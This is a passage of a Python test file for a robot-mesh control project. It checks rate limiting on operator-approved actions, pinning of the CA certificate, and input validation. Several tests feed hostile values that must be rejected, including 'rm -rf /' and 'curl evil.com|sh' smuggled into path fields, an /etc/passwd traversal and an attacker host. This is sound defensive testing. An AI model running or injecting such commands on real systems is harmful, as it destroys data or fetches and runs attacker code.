    for _ in range(3):
        result = fn(action="emergency_stop", tool_context=ctx)
        assert result["status"] == "error"
        assert "declined" in result["content"][0]["text"]

    # The history bucket must STILL be empty because every approval was
    # declined — no slot consumed.
    with rmt._RATE_LOCK:
        bucket = rmt._RATE_HISTORY.get("emergency_stop")
        assert bucket is None or len(bucket) == 0, (
            "Declined approvals consumed rate-limit slots — a genuine "
            "emergency_stop is now locked out for up to 60s. R3-3 reopened."
        )

    # And a 4th attempt — also declined — must STILL not be rate-limited
    # (the rejection reason must say "declined", not "rate limit").
    result = fn(action="emergency_stop", tool_context=ctx)
    assert result["status"] == "error"
    text = result["content"][0]["text"].lower()
    assert "declined" in text
    assert "rate limit" not in text


def test_r3_3_approved_hitl_action_consumes_slot():
    """R3-3 (cont.): an APPROVED action must consume a slot — otherwise
    LLM-driven nuisance is unbounded.
    """
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    ctx = _ctx(response="y")  # operator approves

    # Patch _resolve_mesh to a stub mesh so the approved action can run
    # without an actual networked mesh.
    stub_mesh = MagicMock()
    stub_mesh.emergency_stop.return_value = []
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=stub_mesh):
        result = fn(action="emergency_stop", tool_context=ctx)

    # The action ran (operator approved) — slot must be recorded.
    assert result["status"] == "success", f"approved emergency_stop should succeed, got {result}"
    with rmt._RATE_LOCK:
        bucket = rmt._RATE_HISTORY.get("emergency_stop")
        assert bucket is not None and len(bucket) == 1, (
            "Approved emergency_stop did NOT consume a rate-limit slot — "
            "LLM nuisance is now unbounded. R3-3 (record path) reopened."
        )


def test_r3_3_non_interrupt_action_consumes_slot():
    """R3-3: actions that do NOT require an interrupt (e.g. ``tell``)
    must consume a slot unconditionally — matching the pre-split
    behaviour for non-fleet-wide actions.
    """
    import strands_robots.tools.robot_mesh as rmt

    rmt._reset_rate_limits()
    fn = getattr(rmt.robot_mesh, "__wrapped__", rmt.robot_mesh)
    ctx = _ctx()

    stub_mesh = MagicMock()
    stub_mesh.tell.return_value = "tell-result"
    with patch("strands_robots.tools.robot_mesh._resolve_mesh", return_value=stub_mesh):
        fn(action="tell", target="x", instruction="hi", tool_context=ctx)

    with rmt._RATE_LOCK:
        bucket = rmt._RATE_HISTORY.get("tell")
        assert bucket is not None and len(bucket) == 1


def test_r3_4_provision_existing_ca_always_raw_pin_checked(tmp_path, monkeypatch):
    """R3-4: When a CA file already exists on disk, ``_ensure_ca`` MUST
    always do the raw hash compare regardless of
    ``STRANDS_MESH_DISABLE_CA_PIN``. The break-glass exists for the
    *download* path (re-encoding proxies); silently re-using a rogue
    CA from a prior compromised provisioning run is strictly worse than
    re-fetching every time.
    """
    from strands_robots.mesh.iot import provision

    # Set the break-glass loud and clear.
    monkeypatch.setenv("STRANDS_MESH_DISABLE_CA_PIN", "true")

    # Plant a rogue CA file at the canonical location.
    ca_path = tmp_path / "AmazonRootCA1.pem"
    ca_path.write_bytes(b"-----BEGIN ROGUE CA-----\nfake bytes\n-----END ROGUE CA-----\n")

    # Even with the break-glass set, the existing-file branch must
    # raise — defending against the silent-rogue-reuse attack.
    with pytest.raises(RuntimeError, match="failed pin check"):
        provision._ensure_ca(ca_path)

    # The file must still be on disk (we don't auto-delete; the caller
    # must do that explicitly).
    assert ca_path.exists()


def test_r3_5_validate_command_blocks_pretrained_name_or_path(monkeypatch):
    """R3-5: ``validate_command`` must reject ``pretrained_name_or_path``
    that doesn't match the HF org allowlist, even on otherwise valid
    execute/start commands. Threat-vector #3 is reachable via this kwarg
    without the gate.
    """
    monkeypatch.delenv("STRANDS_MESH_HF_REPO_ALLOW", raising=False)
    from strands_robots.mesh import security as sec

    base_cmd = {
        "action": "execute",
        "instruction": "do thing",
        "policy_host": "localhost",
    }

    # Default allowlist accepts known-good orgs (lerobot, nvidia, huggingface).
    ok = sec.validate_command(dict(base_cmd, pretrained_name_or_path="lerobot/pi0"))
    assert ok["pretrained_name_or_path"] == "lerobot/pi0"

    # Attacker-controlled org must be rejected.
    with pytest.raises(sec.ValidationError, match="pretrained_name_or_path"):
        sec.validate_command(dict(base_cmd, pretrained_name_or_path="evil-corp/backdoor-model"))

    # Path traversal must be rejected.
    with pytest.raises(sec.ValidationError, match="pretrained_name_or_path"):
        sec.validate_command(dict(base_cmd, pretrained_name_or_path="lerobot/../evil/x"))

    # Shell metacharacters must be rejected.
    with pytest.raises(sec.ValidationError):
        sec.validate_command(dict(base_cmd, pretrained_name_or_path="lerobot/pi0; rm -rf /"))


def test_r3_5_validate_command_hf_repo_allow_extends(monkeypatch):
    """R3-5: ``STRANDS_MESH_HF_REPO_ALLOW`` extends the org allowlist."""
    from strands_robots.mesh import security as sec

    monkeypatch.setenv("STRANDS_MESH_HF_REPO_ALLOW", "my-org,trusted-team/specific-model")

    base_cmd = {
        "action": "execute",
        "instruction": "x",
        "policy_host": "localhost",
    }

    # Org-prefix allow → all repos under my-org/ pass.
    ok = sec.validate_command(dict(base_cmd, pretrained_name_or_path="my-org/whatever"))
    assert ok["pretrained_name_or_path"] == "my-org/whatever"

    # Specific full prefix allow → only that prefix.
    ok = sec.validate_command(dict(base_cmd, pretrained_name_or_path="trusted-team/specific-model"))
    assert ok["pretrained_name_or_path"] == "trusted-team/specific-model"

    # Different repo from the allowed team is NOT auto-allowed.
    with pytest.raises(sec.ValidationError):
        sec.validate_command(dict(base_cmd, pretrained_name_or_path="trusted-team/other-model"))


def test_r3_5_validate_command_blocks_model_path_traversal():
    """R3-5: ``model_path`` rejects shell metacharacters and ``..``
    traversal segments even when not requiring HF org match."""
    from strands_robots.mesh import security as sec

    base_cmd = {
        "action": "execute",
        "instruction": "x",
        "policy_host": "localhost",
    }

    # Plain local path is OK.
    ok = sec.validate_command(dict(base_cmd, model_path="/opt/models/my-model"))
    assert ok["model_path"] == "/opt/models/my-model"

    # Path traversal is NOT.
    with pytest.raises(sec.ValidationError, match="model_path"):
        sec.validate_command(dict(base_cmd, model_path="/opt/../etc/passwd"))

    # Shell metacharacters are NOT.
    with pytest.raises(sec.ValidationError):
        sec.validate_command(dict(base_cmd, model_path="/tmp/m;curl evil.com|sh"))

    # NUL bytes / control characters are NOT.
    with pytest.raises(sec.ValidationError):
        sec.validate_command(dict(base_cmd, model_path="/tmp/m\x00malicious"))


def test_r3_5_validate_command_blocks_unknown_policy_type():
    """R3-5: ``policy_type`` rejects values not in the allowlist."""
    from strands_robots.mesh import security as sec

    base_cmd = {
        "action": "execute",
        "instruction": "x",
        "policy_host": "localhost",
    }

    ok = sec.validate_command(dict(base_cmd, policy_type="act"))
    assert ok["policy_type"] == "act"

    ok = sec.validate_command(dict(base_cmd, policy_type="MOCK"))
    assert ok["policy_type"] == "mock"  # canonicalised lowercase

    with pytest.raises(sec.ValidationError, match="policy_type"):
        sec.validate_command(dict(base_cmd, policy_type="evil_remote_exec"))


def test_r3_5_validate_command_blocks_server_address_offnet(monkeypatch):
    """R3-5: ``server_address`` must check the host against the policy-host
    allowlist. The default allowlist is loopback only, so an external
    IP must be rejected unless ``STRANDS_MESH_POLICY_HOST_ALLOW`` permits.
    """
    monkeypatch.delenv("STRANDS_MESH_POLICY_HOST_ALLOW", raising=False)
    from strands_robots.mesh import security as sec

    base_cmd = {
        "action": "execute",
        "instruction": "x",
        "policy_host": "localhost",
    }

    # Loopback OK.
    ok = sec.validate_command(dict(base_cmd, server_address="tcp://127.0.0.1:5555"))
    assert ok["server_address"].endswith(":5555")

    # Off-network blocked.
    with pytest.raises(sec.ValidationError, match="server_address"):
        sec.validate_command(dict(base_cmd, server_address="tcp://198.51.100.1:5555"))

    # ALSO blocked: looks like loopback but is actually a hostname trick.
    with pytest.raises(sec.ValidationError):
        sec.validate_command(dict(base_cmd, server_address="tcp://attacker.example.com:5555"))


def test_r3_6_audit_seq_loaded_lives_on_state_object():
    """R3-6: ``_SEQ_LOADED`` was refactored onto ``_AUDIT_STATE.seq_loaded``
    so static analysers don't trip on a bare ``global`` for a module-
    level scalar (CodeQL #222).
    """
    from strands_robots.mesh import audit

    assert hasattr(audit, "_AUDIT_STATE"), "the refactor must expose _AUDIT_STATE"
    assert hasattr(audit._AUDIT_STATE, "seq_loaded")
    # Defensive: legacy scalar must not be reintroduced.
    assert not hasattr(audit, "_SEQ_LOADED"), (
        "Legacy _SEQ_LOADED scalar reintroduced — CodeQL #222 will reopen. Use _AUDIT_STATE.seq_loaded."
    )


def test_r3_7_persist_seq_chmod_failure_documented():
    """R3-7: the chmod best-effort except-pass in ``_persist_seq_counters``
    has an explanatory comment so CodeQL #225 stays closed.

    Updated for Phase-4 / F3 — _persist_seq_counters now contains
    multiple except blocks (the new symlink-defence path + the original
    chmod best-effort block). We specifically pin the *chmod* block by
    searching downward FROM the chmod call.
    """
    import inspect

    from strands_robots.mesh import audit

    src = inspect.getsource(audit._persist_seq_counters)
    # Find the chmod block.
    chmod_idx = src.index("os.chmod(sidecar, 0o600)")
    tail = src[chmod_idx:]
    # The except clause that wraps chmod must be followed by a
    # comment before `pass`. Look for "except OSError:" and the
    # immediate-next-non-blank line.
    except_pos = tail.index("except OSError:")
    after = tail[except_pos:].splitlines()
    # after[0] is `except OSError:`; after[1..] should include at least
    # one comment line before any `pass` statement.
    has_comment_before_pass = False
    for line in after[1:8]:
        stripped = line.strip()
        if not stripped:
            continue
        if stripped.startswith("#"):
            has_comment_before_pass = True
            break
        if stripped == "pass":
            break

    assert has_comment_before_pass, (
        "_persist_seq_counters chmod block has empty `except OSError: pass` "
        "with no explanatory comment — CodeQL #225 will reopen."
    )


def test_r3_8_sensors_loop_mixin_has_no_stray_docstring():
    """R3-8: ``SensorLoopsMixin`` had two consecutive docstrings, the
    second one parsed as a no-effect string-statement (CodeQL #224).
    Class body must contain only one (the first) docstring.
    """
    import ast
    import inspect

    from strands_robots.mesh import sensors

    src = inspect.getsource(sensors.SensorLoopsMixin)
    tree = ast.parse(src)
    cls = tree.body[0]
    assert isinstance(cls, ast.ClassDef)

    # Walk the class body and count bare string-expression statements.
    # The very first child can be a docstring; any *additional* string
    # expression is a CodeQL #224 statement-with-no-effect.
    stray_strings = []
    for i, node in enumerate(cls.body):
        if isinstance(node, ast.Expr) and isinstance(node.value, ast.Constant) and isinstance(node.value.value, str):
            if i > 0:
                stray_strings.append(node.lineno)

    assert not stray_strings, (
        f"SensorLoopsMixin has {len(stray_strings)} stray string "
        f"expression(s) at lines {stray_strings} — CodeQL #224 will "
        "reopen. Move all class-level prose into the single first docstring."
    )
